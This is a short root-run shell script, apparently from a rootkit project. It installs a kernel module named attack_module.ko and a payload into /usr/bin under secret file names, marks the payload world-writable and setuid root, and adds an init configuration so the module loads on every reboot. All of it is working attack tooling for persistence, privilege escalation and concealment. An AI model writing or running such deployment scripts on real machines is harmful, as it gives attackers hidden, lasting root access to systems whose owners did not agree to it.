# Installs the kernel module, and starts it on reboot.
# Can be undone with undeploy.sh
# This script must be run as root

# deploy the kernel module to the /usr/bin directory
cp -f attack_module.ko "/usr/bin/$(cat secret_ko_name).ko"
echo $?

# deploy the payload to the /usr/bin directory
cp -f payload "/usr/bin/$(cat secret_payload_name)"
echo $?
# mark it as setuid root (probably not needed, but nice to have)
chmod 777 "/usr/bin/$(cat secret_payload_name)"
echo $?
chmod u+s "/usr/bin/$(cat secret_payload_name)"
echo $?

# deploy the startup configuration
cp -f boot.conf "/etc/init/$(cat secret_conf_name).conf"
echo $?
